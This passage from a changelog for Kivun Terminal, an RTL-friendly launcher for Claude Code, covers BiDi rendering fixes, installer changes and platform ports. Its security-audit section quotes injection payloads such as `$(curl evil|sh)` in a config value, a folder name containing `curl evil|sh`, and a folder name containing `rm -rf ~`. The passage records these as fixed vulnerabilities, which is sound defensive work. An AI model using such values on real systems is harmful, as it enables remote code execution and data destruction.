  - **§1a LTR-island fixtures (added 2026-04-24):** 6 new tests in `test/ltr-island.test.js` covering Hebrew-dominant lines with embedded English tokens (the `קלט → Process → תוצאה`, `הפעלה של npm install אמורה לעבוד`, `קובץ config.txt נמצא ב-~/.local/share/`, and `שגיאה ב-line 42 של injector.js` cases plus two non-substitution checks for arrows and box-drawing chars). All 6 pass with the existing RLE/PDF-only algorithm — confirms LRI/PDI isolates are not needed. Total fixture count now 36/36 green.

- **`docs/specs/BIDI_ALGORITHM.md` (new).** Records the three BiDi algorithms considered (RLE/PDF only; RLE/PDF + LRI/PDI; full xterm.js-style state machine) and the evidence-based decision to ship Option A (RLE/PDF only). Also documents the §8 non-substitution rule and the tree-visual-on-Hebrew-lines limitation.

- **Bilingual README (English + Hebrew).** Root `README.md` now has language pill jump-links at the top (`English 🇬🇧` / `עברית 🇮🇱`), with the English content followed by a complete Hebrew mirror — not a machine translation. `<!-- REVIEW_HE -->` markers flag phrases for native-speaker review at PR time.

- **"Related projects in the RTL-for-AI-tools community" section** linking the three sibling userland fixes shipping today: [Adaptive-RTL-Extension](https://github.com/Lidor-Mashiach/Adaptive-RTL-Extension) by Lidor Mashiach (browser DOM), [rtl-for-vs-code-agents](https://github.com/GuyRonnen/rtl-for-vs-code-agents) by Guy Ronnen (VS Code webview), and this repo (terminal). Three disjoint surfaces, three independent userland fixes — itself a comment on how overdue the upstream BiDi work is.

### Non-goals (HEAVY §8 addition, 2026-04-24)

- **No character substitution.** Direction comes from BiDi markers only; arrows (`→ ← ↑ ↓`), box-drawing chars (`├ └ │ ─ ┌ ┐ ┘ ┤`), and other directionally-asymmetric glyphs pass through unchanged. Lidor Mashiach's browser extension swaps `→`↔`←` in Hebrew paragraphs (correct for DOM), but that would corrupt tree renderers and status indicators in Claude Code TUI output. Enforced by absence (no character-mapping table in `lib/injector.js`) plus a top-of-file comment to catch well-intentioned PRs.

### Changed

- **`payload/config.txt`** gains a `KIVUN_BIDI_WRAPPER` section (default `on`). Existing `config.txt` files from prior installs are preserved on upgrade - those users won't have the key at all, and the launcher treats missing = `off`. To pick up the new default, delete `%LOCALAPPDATA%\Kivun-WSL\config.txt` and rerun the installer.
- **`payload/kivun-launch.sh`** (WSL-side, invoked from `kivun-terminal.bat`) and **`linux/kivun-launch.sh`** (native-Linux launcher): conditional wrapper invocation based on `KIVUN_BIDI_WRAPPER`. Both launchers log the decision (`active` / `off` / `fallback WARNING`) so config drift is visible in `BASH_LAUNCH_LOG.txt` / `launch.log`.
- **Linux launcher** writes `CLAUDE_EXEC` to its `launch-env.sh` via `printf %q`, preserving the #2 security property from the v1.0.6 audit (no command-substitution re-evaluation of values coming from user-editable config).

### Notes

- **Default-on rationale.** Earlier draft had the wrapper opt-in with a v1.2.0 default-flip after a 4-week feedback window. Dropped that: user base is small, the feedback-window signal thin, and "Hebrew just works after install" is the product promise - requiring a config edit to get the fix contradicts that. Rollback path if wrapper breaks in the wild: single-line `KIVUN_BIDI_WRAPPER=off` edit documented in TROUBLESHOOTING; v1.1.1 hotfix flips the shipped default back if root-cause fix isn't ready in 48 hours. See `docs/specs/ROADMAP.md` for details.
- **Bullet-line fix verified empirically.** The `● שלום` first-line LTR bug from v1.0.6 is fixed in v1.1.0. Verification process: `docs/research/paragraph-direction-test.sh` run on a real KivunTerminal-profile Konsole tested 9 Unicode marker placements; only RLM at position 0 flipped the paragraph direction to RTL. RLE/RLI whole-line wraps did NOT flip paragraph direction (they only affect within-run embedding). The wrapper uses a line-start buffering loop to inject RLM at position 0 whenever the line's first strong char is Hebrew.
- **Still pending before tag:** integration gate §1 run on real Konsole, 1-day production canary on the lead dev's real Claude Code usage, `VERSION` bump 1.0.6 → 1.1.0.

## [1.0.6] - 2026-04-19

### Security hardening pass - 2026-04-21

Full independent security review of the mac, linux, and Windows installer surfaces. 19 findings triaged across 3 critical, 7 high, 6 medium, 3 low. 17 fixed, 1 narrowed, 1 partial, 3 deferred (code-signing).

**Critical**

- **Config-driven RCE in Linux launcher (`payload/kivun-launch.sh`).** The tmp launch-script heredoc was unquoted, so `CLAUDE_FLAGS=$(curl evil|sh)` in `config.txt` would embed a literal `$(...)` into the generated script which bash then executed at launch. Fix: heredoc is now `<<'LAUNCHEOF'` (no interpolation), config values are written to a separate `launch-env.sh` via `printf %q` and sourced by the inner script. Live-tested with a malicious payload - the `$(...)` now passes through to claude as 4 literal argv tokens and never executes.
- **macOS Automator Quick Action shell injection (`mac/scripts/postinstall`).** The workflow built a shell command from the right-clicked folder name and passed it to AppleScript `do script`. A folder named `x'; curl evil|sh; #` would execute. Fix: consolidated the 80-line duplicated workflow body down to a 20-line dispatcher that forwards via `printf %q` + AS double-escape to the desktop `.command` shortcut, which has injection-safe arg handling.
- **macOS postinstall sudoers `NOPASSWD:ALL`.** The Homebrew bootstrap temporarily wrote a sudoers file granting the user passwordless sudo for *all* commands for a 30–60s window; if SIGKILL'd or power-cut during that window, the file would persist indefinitely. Narrowed to `NOPASSWD: /usr/bin/true` (enough for Homebrew's `sudo -v` pre-flight, nothing more) + proactive stale-file sweep on every install + `at`-scheduled 15-minute fallback removal. If Homebrew ever needs real sudo it now fails loud instead of silently receiving root.

**High**

- **Default credentials removed from `payload/config.txt`.** Shipped `USERNAME=username` / `PASSWORD=password` defaults were flagged by secret-scanners (gitleaks, truffleHog, GitHub push-protection) and were also a terrible pattern. WSL Ubuntu account is now created interactively on first boot; no credential keys in the file. Matching updates in `docs/SECURITY.txt` and `docs/CREDENTIALS.txt`.
- **`payload/kivun-terminal.bat` - unquoted SET inside FOR body.** `set RESPONSE_LANGUAGE=%%b` let CMD parse the config value - a line `RESPONSE_LANGUAGE=english& calc.exe` would execute `calc.exe` during config load. All 5 keys now use the quoted form `set "K=%%b"`.
- **`payload/kivun-terminal.bat` - folder-name injection in WSL invocation.** `bash -l -c "cd '%WSL_PATH%'..."` interpolated the folder path into single-quotes - a folder named `a';rm -rf ~;'` escaped and executed `rm`. Now passes via environment: `wsl ... env KIVUN_DIR="%WSL_PATH%" bash -c 'cd "$KIVUN_DIR"'`.
- **`payload/kivun.xlaunch` - X11 access control disabled.** `ExtraParams="-ac"` + `DisableAC="True"` let any local process (any Windows user, any LAN peer through the firewall) connect to VcXsrv display `:0` and keylog/screengrab. Fixed: `-ac` removed, `DisableAC="False"`, and the WSL-side launcher now authorizes only the invoking UID via `xhost +si:localuser:$USER` instead of the blanket `xhost +local:`.
- **NSI installer - VcXsrv TEMP-dropper pattern removed.** The installer was doing `curl -o $TEMP\vcxsrv_installer.exe` followed by silent-exec - the exact 4-factor cluster (download-to-temp + silent-install + elevation + unsigned parent) that trips Defender/SmartScreen cloud heuristics. Auto-install is gone entirely; the installer now opens the official VcXsrv page in the user's browser and prompts them to install manually. The VcXsrv section is now optional (`Section /o`) instead of pre-selected.
- **NSI installer - `curl \| bash` for Claude Code replaced with download-then-run.** Mid-download network drop previously left bash parsing a truncated script. Now: `curl -o $T && [ -s "$T" ] && bash "$T"` with `set -o pipefail` so a failed curl can be detected. Same fix applied in the Linux installer.
- **NSI installer - dropped `RequestExecutionLevel admin`.** Installer writes entirely to `$LOCALAPPDATA\Kivun-WSL` (per-user) and `HKCU` - running elevated meant those writes landed in the elevating admin's hive under over-the-shoulder UAC, making the install invisible to the invoking user. Now runs as `user`; the one admin-required step (`wsl --install` when WSL isn't already set up) becomes a documented prerequisite with clear instructions to run `wsl --install` from admin PowerShell first, then re-launch our installer normally.

**Medium**

- **`mac/scripts/postinstall` iTerm2 fallback** had the same folder-name shell-injection pattern as the Automator workflow. Fixed with a POSIX `shell_quote` helper + AppleScript double-escape for the `write text` literal.
- **Language prompt double-wrapping** in the Automator workflow case block - it stored `LANG_PROMPT="--append-system-prompt \"...\""` and then passed it as `claude --append-system-prompt '$LANG_PROMPT'`, producing `--append-system-prompt --append-system-prompt "..."`. Resolved via the consolidation above: the new shared `payload/languages.sh` returns just the phrase, and the `.command` shortcut wraps it in `--append-system-prompt` itself.
- **`payload/configure-statusline.js` path-with-quote injection.** Using `'node "' + path + '"'` would break on a path containing `"` and inject into Claude Code's `settings.json.statusLine.command`. Switched to `'node ' + JSON.stringify(path)` - JSON-safe and shell-safe.
- **Config parsers missing trailing-newline guard.** `while IFS='=' read -r key value; do …; done` dropped the last line if the config file didn't end in `\n`. Added `|| [[ -n "$key" ]]` to both the Linux launcher and the mac `.command` parsers.
- **Launcher tmpfile TOCTOU.** `/tmp/kivun-claude-launch-$UID.sh` was in a world-writable sticky-bit dir; a malicious local user could pre-symlink it to `~/.bashrc` and have `cat >` clobber it. Moved to `${XDG_CACHE_HOME:-$HOME/.cache}/kivun-terminal/claude-launch.sh` (user-owned, 0700).

**Architectural improvements done in the same pass**

- **`payload/languages.sh`** - single source of truth for the 23-language prompt map, sourced by both the Linux launcher and the macOS `.command` shortcut. Replaced ~70 lines of duplicated case statements that had already drifted (different hyphen/underscore conventions; extra undocumented keys in the Automator path). Also removes one vector for the Automator-vs-shortcut drift problem.
- **`mac/uninstall.sh`** (100 lines, new) - removes desktop `.command`, Finder Quick Action, shell-rc `CLAUDE_CODE_STATUSLINE` export, `statusLine` entry from `~/.claude/settings.json` (via Python JSON edit), `/usr/local/share/kivun-terminal/` tree, pkg receipt, and any stale sudoers file. Deployed into the `.pkg` at `/usr/local/share/kivun-terminal/uninstall.sh`; also available standalone in the repo. Matches the Linux uninstaller's scope and UX.
- **Statusline SHA256 integrity check.** Build-time step generates `statusline.mjs.sha256`; both installers verify before `cp`. Mismatch logs an error and skips install rather than shipping a corrupted file silently. Defends against pkg-extraction corruption.
- **kdialog on KDE instead of zenity.** Linux installer detects `$XDG_CURRENT_DESKTOP` and installs `kdialog` on KDE/Plasma (saves ~30 MB of GTK dependencies that get pulled in by zenity, which doesn't matter to anyone outside our target audience - RTL+Konsole users are overwhelmingly KDE). The launcher tries `kdialog` first when `XDG_CURRENT_DESKTOP=KDE`.

**Deferred (require a code-signing certificate purchase, not a code change)**

- Signed Authenticode `Kivun_Terminal_Setup.exe` - Azure Trusted Signing ~$10/mo or a standard Authenticode cert. Once available, `build-windows.yml` needs a `signtool sign` step between build and release-attach.
- Pre-release submission to Microsoft Defender analysis at `https://www.microsoft.com/en-us/wdsi/filesubmission` to shrink the SmartScreen warning window for early downloaders.
- Signed uninstaller (same cert).

These three together close all remaining "unsigned installer" findings; they are all downstream of buying a cert.

### Phase 3 - Linux port - 2026-04-20

New `linux/` directory with a shell-script installer that covers the four major Linux package ecosystems (apt, dnf, pacman, zypper) and integrates with both GNOME Files (Nautilus) and KDE Dolphin.

- **`linux/install.sh`** - detects distro via `/etc/os-release`, picks the right package manager, installs `konsole`, `nodejs`, `git`, `xdotool`, `wmctrl`, and a color-emoji font. Installs Claude Code via `curl https://claude.ai/install.sh | bash` (skipped if `claude` is already on PATH). Runs as the invoking user; sudo is only requested for the package-install step (with a background keep-alive so the user isn't prompted repeatedly during long installs).
- **`linux/kivun-launch.sh`** - simplified launcher (no WSLg / VcXsrv paths): loads `~/.config/kivun-terminal/config.txt`, refreshes the Konsole profile with the current BiDi/color settings, runs `setxkbmap` for Alt+Shift keyboard toggle (X11 only - warns on Wayland), resolves the target folder (CLI arg → zenity/kdialog picker → `$HOME`), builds a tmp inner-script, and `exec`s Konsole with `--profile KivunTerminal --workdir $TARGET -e $TMP`. Passes Claude `--settings ~/.local/share/kivun-terminal/settings.json` so the statusline always finds the Linux-path `node` binary.
- **`linux/uninstall.sh`** - removes the launcher, Konsole profile, desktop entries, Nautilus script, and Dolphin service menu. Keeps system packages and asks before removing the color scheme or `config.txt`.
- **`linux/kivun-terminal.desktop`** - app-menu entry with `@@HOME@@` placeholder substituted at install time. Declares `MimeType=inode/directory` so it's discoverable as an "Open with" handler for folders, plus `Actions=OpenHome;OpenPicker` for jumplist-style right-click menus.
- **`linux/nautilus-script`** - GNOME Files right-click integration. Reads `NAUTILUS_SCRIPT_SELECTED_FILE_PATHS` (primary) and `NAUTILUS_SCRIPT_CURRENT_URI` (fallback for folder-background context); if the user right-clicked a file rather than a folder, drops to its parent dir.
- **`linux/dolphin-servicemenu.desktop`** - KDE Dolphin service menu using `X-KDE-Priority=TopLevel` so "Open with Kivun Terminal" appears directly on the context menu instead of buried under Actions.
- **`.github/workflows/build-linux.yml`** - CI job on `ubuntu-latest`: syntax-checks all scripts with `bash -n`, pre-installs the packages `install.sh` would otherwise fetch, dry-runs the installer end-to-end, verifies the expected artifacts landed under `$HOME/.local/`, then packages `linux/` + `payload/` + `LICENSE` + `VERSION` into `kivun-terminal-linux-<VER>.tar.gz`. Uploads as an Actions artifact + attaches to GitHub Release on tag push.
- **`linux/README.md`** - quickstart, config schema, supported distros table, Wayland keyboard caveat, uninstall instructions.

Design notes:

- **No WSL / VcXsrv code paths** - on Linux we have a real X11 or Wayland session. `kivun-launch.sh` is ~200 lines instead of ~500 on WSL.
- **Config file at `~/.config/kivun-terminal/config.txt`** (XDG-standard) rather than `~/Library/Application Support/…` (macOS) or `%LOCALAPPDATA%\Kivun-WSL\…` (Windows). Schema unchanged: same `RESPONSE_LANGUAGE`, `TEXT_DIRECTION`, `TERMINAL_COLOR`, `FOLDER_PICKER`, `CLAUDE_FLAGS` keys. New Linux-only `KEYBOARD_TOGGLE` (default `true`).
- **Konsole profile + ColorSchemeNoam** copied verbatim from the WSL build - same `BidiEnabled=true, BidiLineLTR=false` pair that gives Hebrew auto-detected right-alignment while English stays left-aligned.
- **Hebrew first-line limitation** - same upstream [#39881](https://github.com/anthropics/claude-code/issues/39881) issue documented in `README.md` with a link to 👍 it. Konsole handles the rest of the reply correctly.

### Phase 2 - macOS port - 2026-04-20

New `mac/` directory with a `pkgbuild`-based `.pkg` installer modeled on the reference project's postinstall (715 lines), rebranded to Kivun Terminal.

- **`mac/scripts/postinstall`** - installs Xcode CLT, Homebrew (with temp-sudoers fix for non-TTY `.pkg` context), Node, Git, Claude Code, statusline, config file, desktop `.command` shortcut with Finder folder picker + Terminal.app color theme, Finder Quick Action Automator workflow.
- **`mac/build.sh`** - local builder. Stages `statusline.mjs` + `configure-statusline.js` next to `postinstall` and runs `pkgbuild --nopayload --scripts mac/scripts`.
- **`.github/workflows/build-mac.yml`** - CI builder on `macos-latest`. Runs on tag push and manual dispatch, attaches the `.pkg` to GitHub Releases.
- **`mac/README.md`** - quickstart + config schema + build instructions.
- **Terminal choice** - new `MAC_TERMINAL=terminal|iterm2|wezterm` config key. Default `terminal`; when set to `iterm2` or `wezterm`, the desktop `.command` shortcut re-spawns into that emulator for better BiDi/RTL rendering.
- **Config schema** unified with the Windows build: same 23-language `RESPONSE_LANGUAGE`, `TERMINAL_COLOR`, `TEXT_DIRECTION`, `FOLDER_PICKER`, `CLAUDE_FLAGS` keys. `USE_VCXSRV` (Windows-only) is commented out and explicitly noted.
- Hyphen naming (e.g. `azeri-south`) aligned with the Windows build. Underscore variants still accepted in the case statement for backward compat with users migrating from the reference.

Phase 2 is build-only for now - the user doesn't have a Mac to smoke-test on, so verification runs via the GitHub Actions `macos-latest` runner. Phase 3 (Linux `install.sh`) is next.

### Post-release patches - 2026-04-20

Second-day patches applied to the 1.0.6 payload (version string still unchanged; rebuilt `Kivun_Terminal_Setup.exe`).

#### Features ported from `kivun-terminal` (the sibling native Windows + macOS project)

- **Statusline** (`payload/statusline.mjs`, `payload/configure-statusline.js`) - 2-line ANSI-coloured status bar shown at the bottom of Claude Code's TUI. Line 1: folder, model (green for Opus, yellow for Sonnet/Haiku), context-usage bar, total tokens, session duration, cwd. Line 2: `Session -- undefined -- | Weekly -- undefined --` placeholders (Claude Code 2.1.71 doesn't expose rate-limit data to statusline stdin; byte-for-byte matching the reference project's output).
- **23-language prompt table** (`payload/kivun-terminal.bat` `:SET_LANG_PROMPT`) - expanded from the old 2-branch (English/Hebrew) to the full 23-language set: english, hebrew, arabic, persian, urdu, kurdish, pashto, sindhi, yiddish, syriac, dhivehi, nko, adlam, mandaic, samaritan, dari, uyghur, balochi, kashmiri, shahmukhi, azeri-south, jawi, turoyo.
- **Folder picker on launch** (`payload/folder-picker.wsf`) - optional via `FOLDER_PICKER=true` in `config.txt`. Native Windows folder-browse dialog pops before Konsole opens. Right-click "Open with Kivun Terminal" context-menu entries bypass it.
- **`fonts-noto-color-emoji`** added to installer step `[4/7]` so emojis (`👋`, `🔧`, `💻`, etc.) render as colour glyphs in Konsole instead of tofu boxes.
- **`VCXSRV X SERVER`** default flipped to `USE_VCXSRV=true` in `config.txt` - VcXsrv is the reliable path for Alt+Shift keyboard switching; launcher still falls back cleanly to WSLg if VcXsrv isn't installed or reachable.
- **Save-defaults on reinstall** - NSIS now wraps the `config.txt` `File` directive in `${IfNot} ${FileExists}` so existing user edits survive reinstall.

#### Statusline & settings plumbing (WSL-specific)

- **Statusline registration** (`payload/kivun-launch.sh`) - idempotent on every launch: copies `statusline.mjs` into `~/.local/share/kivun-terminal/`, fixes line endings, writes a dedicated `~/.local/share/kivun-terminal/settings.json` with just `{statusLine.type, statusLine.command}`, and also updates `~/.claude/settings.json` via `configure-statusline.js`.
- **`--settings` flag** - the tmp Claude-launch script invokes `claude --settings "$KT_SETTINGS" --append-system-prompt "..."`. Necessary because when cwd is under `/mnt/c/Users/<user>/`, Claude walks up the directory tree and picks up `%USERPROFILE%/.claude/settings.json`, which has a Windows-path `statusLine.command` (`node "C:/..."`) that Linux `node` cannot execute - silently breaking the user-home registration. The `--settings` override guarantees the Linux-path statusline wins.
- **Only-install-Node-if-missing** - NSIS step `[5/7]` now runs `command -v node >/dev/null` before `apt-get install nodejs npm`. When Claude's installer script has already placed a non-apt Node (common when Claude Code was installed prior to our installer), apt would otherwise fail with `exit 100 - held broken packages`.
- **`x11-xserver-utils` added to step `[4/7]`** so `xrandr` is available for primary-monitor detection (falls back to Xinerama head-at-0,0 when `xrandr` doesn't expose a `connected primary` tag).

#### Konsole positioning & window management

- **Primary-monitor-only window** (no longer spans both screens on dual-monitor setups). `payload/kivun-terminal.bat` queries Windows via `wmic DESKTOPMONITOR` (PowerShell is blocked by Group Policy on some machines - wmic works where PS doesn't). Passes `X Y W H` as a 7th argument to `kivun-launch.sh`.
- **80% of primary-monitor, centered** - users wanted a windowed-but-roomy default instead of maximized. Computed as `(TARGET_W*80/100, TARGET_H*80/100)`, positioned at the centre of the primary monitor.
- **Shortcut + WSL bash subprocess launch minimized** - `SW_SHOWMINIMIZED` on the desktop/Start Menu shortcut, `start "Kivun Bash" /MIN` on the WSL bash child. No visible CMD windows cluttering the desktop; all output still in `LAUNCH_LOG.txt` / `BASH_LAUNCH_LOG.txt`.
- **No `pause` on success paths** - the bat exits cleanly once Konsole is confirmed running (minimized window would otherwise need user to click it to dismiss).

#### Hebrew RTL - known upstream limitation documented

- **Upstream issue filed & consolidated** - [anthropics/claude-code#39881](https://github.com/anthropics/claude-code/issues/39881) tracks this. Detailed BiDi analysis + Option-A (RLM-prefix) fix proposal posted as a comment: [#39881 (comment)](https://github.com/anthropics/claude-code/issues/39881#issuecomment-4281323284). Full internal analysis kept at `docs/FEATURE_REQUEST_ANTHROPIC.md`; trimmed public version at `docs/FEATURE_REQUEST_ANTHROPIC_ISSUE.md`.
- **Prompt hack reverted** - earlier attempts to instruct Claude via `--append-system-prompt` to start replies with a dash / header / blank line all failed (Claude ignored formatting constraints on roughly half of replies). `RLM_SUFFIX` is now empty; the system prompt is minimal (`"Always respond in <Language>"` only), matching the reference project. Saves tokens and avoids brittle failing instructions.
- **TROUBLESHOOTING.md** - new section "Claude's Hebrew/Arabic response is left-aligned on the first line" explaining the upstream nature of the issue, what does and doesn't work, and a link to #39881 so users can 👍 it.

### Post-release patches - 2026-04-19 (same-day)

Patches applied to the 1.0.6 payload (version string unchanged; rebuilt `Kivun_Terminal_Setup.exe`).

#### Installer (`installer/Kivun_Terminal_Setup.nsi`)

- **WSL2 setup** - explicitly run `wsl --set-default-version 2` and `wsl --update` before installing Ubuntu; if Ubuntu exists on WSL1, convert it silently with `wsl --set-version Ubuntu 2`. Eliminates the `WSL1 is not supported with your current machine configuration` noise at the top of the install log.
- **Konsole install no longer hangs.** Root causes were (1) `sudo apt-get ...` waiting forever for a password with no TTY, and (2) NSIS `nsExec::ExecToLog` deadlocking on high-volume apt output (~300–500 MB of KDE dependencies). Now runs as `wsl -d Ubuntu -u root`, redirects output to `/tmp/kivun-apt.log`, and uses `nsExec::Exec` (no pipe capture). Install split into 6 numbered steps so Cancel is usable between them.
- **Every error path ends in an OK/Cancel MessageBox** - no more Task-Manager-to-kill-installer situations.
- **VcXsrv section default-checked** (`Section "VcXsrv..."` instead of `Section /o ...`) and **auto-skips** when VcXsrv is already installed. Check uses `$PROGRAMFILES64\VcXsrv\vcxsrv.exe` (NSIS is 32-bit, so plain `$PROGRAMFILES` is WOW64-redirected to `Program Files (x86)` - the wrong path) and falls back to `SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\VcXsrv is X server` in both 32- and 64-bit registry views.
- **Desktop shortcut now actually appears.** Two bugs: (a) `kivun_icon.ico` was referenced by the shortcut but never copied to `$INSTDIR` (added to `File` directives); (b) admin-elevated `$DESKTOP` / `$SMPROGRAMS` pointed at the elevated account's folders, not the invoking user's - added `SetShellVarContext current` in both install and uninstall sections.

#### Windows launcher (`payload/kivun-terminal.bat`)

- **Bat parsing fix.** Added `REM` and a nested `for ... call :STRIP_CR %%V` inside an `if exist config.txt (...)` block broke CMD's nested-parens parser and the script silently exited mid-run (no visible error, no CMD window, `LAUNCH_LOG.txt` just cut off). Reverted the config parser to the original simple form.
- **CR-tolerant language match.** Config lines come in as CRLF, so `%RESPONSE_LANGUAGE%` can end up as `english\r`. Comparison now uses `%RESPONSE_LANGUAGE:~0,6%` - first 6 chars, trailing CR harmless.
- **WSL path conversion for `$INSTDIR`.** `%~dp0` ends with `\`, which `wslpath` interprets as an escape. Now strips the trailing backslash before calling `wslpath -a`, and if that still fails, falls back to manual drive-letter conversion via the new `:WIN_TO_WSL_PATH` subroutine. Without this, the launch command was built with an empty `INST_WSL`, shifting every argument and passing an empty `CLAUDE_PROMPT` to `claude --append-system-prompt`.
- **Run as the WSLg-dir owner.** `wsl -d Ubuntu ...` now detects `stat -c %U /mnt/wslg/runtime-dir` and passes `--user <owner>`. See the TROUBLESHOOTING note on Qt runtime-dir checks for why this matters.
- **CRLF line endings enforced.** `kivun-terminal.bat` must be saved as CRLF. Files round-tripped through WSL/`cp` get LF-only endings, which CMD's parser silently mishandles in nested blocks.

#### WSL launcher (`payload/kivun-launch.sh`)

- **Hebrew RTL alignment.** Changed `BidiLineLTR` from `true` to `false` in the generated Konsole profile when `TEXT_DIR=rtl`. With `BidiLineLTR=true`, BiDi reordered the letters correctly but left the line base direction LTR (Hebrew showed left-aligned); with `false`, Konsole auto-detects line direction and Hebrew lines become RTL/right-aligned while English lines stay LTR.
- **`XDG_RUNTIME_DIR` no longer broken.** Previous logic replaced WSLg's `/mnt/wslg/runtime-dir` with a private `/tmp/runtime-<uid>` whenever `[ ! -O ]` returned true - which breaks Konsole's Wayland/D-Bus socket discovery because sockets live in the WSLg dir. Now tests `-d && -w && -S $WSLG_DIR/wayland-0` and keeps WSLg's dir when usable.
- **Qt permission check.** When we own `/mnt/wslg/runtime-dir` (i.e. we were launched as the right user), `chmod 700` on startup so Qt's `0700 only` check passes - without this, `QStandardPaths: wrong permissions ... 0777 instead of 0700` means no visible Konsole window.
- **Stale konsole cleanup.** `pkill -x -u $UID konsole` before launch - zombie Konsole processes from earlier failed runs were being picked up by `xdotool search --class konsole` as the "found Konsole window," making every retry appear to succeed while the new window never rendered.
- **Per-UID temp script path.** `/tmp/kivun-claude-launch-$(id -u).sh` instead of a fixed path. A stale file owned by a different UID (from an earlier run) would cause `Permission denied` on overwrite and make Konsole launch the old script's contents.
- **Better temp-script diagnostics.** Now prints the `claude` binary location, working dir, and exit code. If `claude` isn't in `PATH`, prints install instructions instead of silently closing.

#### Docs

- TROUBLESHOOTING.md - added sections for Qt runtime-dir checks, installer-appears-frozen, silent-bat-exit, and permission-denied on the temp script.


### Added - first standalone release

Kivun Terminal is carved out of the `chat/` folder in the ClaudeCode Launchpad CLI repo and published as its own product: a WSL2 + Ubuntu + Konsole launcher for Claude Code with real RTL/BiDi rendering that Windows Terminal cannot provide.

- **NSIS installer** (`Kivun_Terminal_Setup.exe`) - single-click installation of WSL2, Ubuntu, Konsole, wmctrl, xdotool, and the Claude Code CLI.
- **Dedicated install directory** `%LOCALAPPDATA%\Kivun-WSL` - separates logs, config, and launchers from Launchpad CLI v2.4.x (`%LOCALAPPDATA%\Kivun`), allowing both products to coexist on the same machine.
- **11 supported RTL languages** via `PRIMARY_LANGUAGE` in `config.txt`: hebrew, arabic, persian, urdu, pashto, kurdish, dari, uyghur, sindhi, azerbaijani (with Hebrew as default).
- **`KivunTerminal` Konsole profile** (renamed from `ClaudeHebrew` - the old name implied Hebrew-only). Deployed automatically on first launch.
- **`ColorSchemeNoam`** color scheme - light blue background (`#C8E6FF`) with dark foreground for readability.
- **VERSION file** drives the product version string in both the NSIS build and the batch launcher (single source of truth).
- **VcXsrv mode** (optional component) - enables real Alt+Shift keyboard layout switching inside Konsole. Falls back to WSLg when VcXsrv isn't available.
- **Right-click folder integration** (optional component) - "Open with Kivun Terminal" entry on Windows Explorer folder context menus.
- **Desktop + Start Menu shortcuts** - quick launch into `%USERPROFILE%`.
- **GitHub Actions release pipeline** (`build-windows.yml`) - tagging `v1.0.6` automatically builds `Kivun_Terminal_Setup.exe` and attaches it to the GitHub Release. RC and beta tags are marked pre-release.
- **Docs** - README, README_INSTALLATION, SECURITY, CREDENTIALS, TROUBLESHOOTING.

### Fixed - issues inherited from `chat/`

- `kivun-terminal.bat` referenced `%~dp0kivun.xlaunch`, which did not exist. `kivun.xlaunch` is now shipped in the payload.
- Launcher previously wrote logs to `%LOCALAPPDATA%\Kivun\` - the same directory Launchpad CLI uses. Changed to `%LOCALAPPDATA%\Kivun-WSL\` to prevent cross-contamination.
- Konsole profile name hardcoded as `ClaudeHebrew` despite 11 supported languages. Renamed to `KivunTerminal`.
- `config.txt` referenced three documentation files (`SECURITY.txt`, `CREDENTIALS.txt`, `README_INSTALLATION.md`) that never existed. All three are now written and shipped.

### Known limitations

- Installer is unsigned - Windows SmartScreen will show a warning on first run. Code signing requires a certificate (~$100/year) and is deferred.
- Konsole statusline (Sonnet/Opus badge, context %, session usage) - present in Launchpad CLI v2.4.x but not yet ported to this WSL variant. Planned for v1.1.
- macOS and native Linux builds are out of scope for v1.0.6. Planned for v1.1 (macOS via `pkgbuild` and GitHub Actions `macos-latest` runner).

[1.1.7]: https://github.com/noambrand/kivun-terminal-wsl/releases/tag/v1.1.7
[1.1.6]: https://github.com/noambrand/kivun-terminal-wsl/releases/tag/v1.1.6
[1.1.5]: https://github.com/noambrand/kivun-terminal-wsl/releases/tag/v1.1.5
[1.1.4]: https://github.com/noambrand/kivun-terminal-wsl/releases/tag/v1.1.4
[1.1.3]: https://github.com/noambrand/kivun-terminal-wsl/releases/tag/v1.1.3
[1.1.2]: https://github.com/noambrand/kivun-terminal-wsl/releases/tag/v1.1.2
[1.1.1]: https://github.com/noambrand/kivun-terminal-wsl/releases/tag/v1.1.1
[1.1.0]: https://github.com/noambrand/kivun-terminal-wsl/releases/tag/v1.1.0
[1.0.6]: https://github.com/noambrand/kivun-terminal-wsl/releases/tag/v1.0.6
